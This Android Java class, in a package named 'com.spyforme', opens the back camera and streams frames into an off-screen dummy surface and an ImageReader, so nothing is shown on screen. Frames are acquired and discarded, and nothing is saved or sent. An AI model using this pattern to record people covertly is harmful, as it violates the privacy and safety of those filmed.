package com.spyforme;

import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.view.Surface;

import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;

import java.util.Arrays;

public class CameraHandler {
    private static final String TAG = "CameraHandler";
    private static final int IMAGE_WIDTH = 640;
    private static final int IMAGE_HEIGHT = 480;
    
    private Context context;
    private CameraManager cameraManager;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private String cameraId;
    private SurfaceTexture dummySurfaceTexture;
    private Surface dummySurface;

    public CameraHandler(Context context) {
        this.context = context;
        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
    }

    public void initialize() {
        if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Camera permission not granted");
            return;
        }

        startBackgroundThread();
        openCamera();
    }

    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Error stopping background thread", e);
            }
        }
    }

    private void openCamera() {
        try {
            // Get the first available camera (usually back camera)
            String[] cameraIdList = cameraManager.getCameraIdList();
            if (cameraIdList.length == 0) {
                Log.e(TAG, "No cameras available");
                return;
            }
            
            // Try to find back camera first
            for (String id : cameraIdList) {
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(id);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    cameraId = id;
                    break;
                }
            }
            
            // If no back camera, use first available
            if (cameraId == null) {
                cameraId = cameraIdList[0];
            }

            Log.d(TAG, "Opening camera: " + cameraId);
            cameraManager.openCamera(cameraId, stateCallback, backgroundHandler);
            
        } catch (CameraAccessException | SecurityException e) {
            Log.e(TAG, "Error opening camera", e);
        }
    }

    private final CameraDevice.StateCallback stateCallback = new CameraDevice.StateCallback() {
        @Override
        public void onOpened(@NonNull CameraDevice camera) {
            Log.d(TAG, "Camera opened successfully");
            cameraDevice = camera;
            createCameraPreviewSession();
        }

        @Override
        public void onDisconnected(@NonNull CameraDevice camera) {
            Log.d(TAG, "Camera disconnected");
            camera.close();
            cameraDevice = null;
        }

        @Override
        public void onError(@NonNull CameraDevice camera, int error) {
            Log.e(TAG, "Camera error: " + error);
            camera.close();
            cameraDevice = null;
        }
    };

    private void createCameraPreviewSession() {
        try {
            // Create a dummy surface for the camera preview
            // This is needed because Camera2 API requires at least one output surface
            dummySurfaceTexture = new SurfaceTexture(0);
            dummySurfaceTexture.setDefaultBufferSize(IMAGE_WIDTH, IMAGE_HEIGHT);
            dummySurface = new Surface(dummySurfaceTexture);

            // Create ImageReader for capturing images
            imageReader = ImageReader.newInstance(
                    IMAGE_WIDTH,
                    IMAGE_HEIGHT,
                    ImageFormat.JPEG,
                    2
            );

            imageReader.setOnImageAvailableListener(reader -> {
                // Image available - could be processed or saved here
                android.media.Image image = reader.acquireLatestImage();
                if (image != null) {
                    Log.d(TAG, "Image captured");
                    image.close();
                }
            }, backgroundHandler);

            // Create capture session
            cameraDevice.createCaptureSession(
                    Arrays.asList(dummySurface, imageReader.getSurface()),
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(@NonNull CameraCaptureSession session) {
                            if (cameraDevice == null) {
                                return;
                            }
                            
                            captureSession = session;
                            try {
                                // Create capture request
                                CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(
                                        CameraDevice.TEMPLATE_PREVIEW
                                );
                                captureBuilder.addTarget(dummySurface);
                                
                                // Start continuous preview
                                captureSession.setRepeatingRequest(
                                        captureBuilder.build(),
                                        null,
                                        backgroundHandler
                                );
                                
                                Log.d(TAG, "Camera preview session started");
                            } catch (CameraAccessException e) {
                                Log.e(TAG, "Error starting camera preview", e);
                            }
                        }

                        @Override
                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                            Log.e(TAG, "Failed to configure camera session");
                        }
                    },
                    backgroundHandler
            );
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error creating camera preview session", e);
        }
    }

    public void release() {
        Log.d(TAG, "Releasing camera resources");
        
        if (captureSession != null) {
            captureSession.close();
            captureSession = null;
        }
        
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        
        if (dummySurface != null) {
            dummySurface.release();
            dummySurface = null;
        }
        
        if (dummySurfaceTexture != null) {
            dummySurfaceTexture.release();
            dummySurfaceTexture = null;
        }
        
        stopBackgroundThread();
    }
}
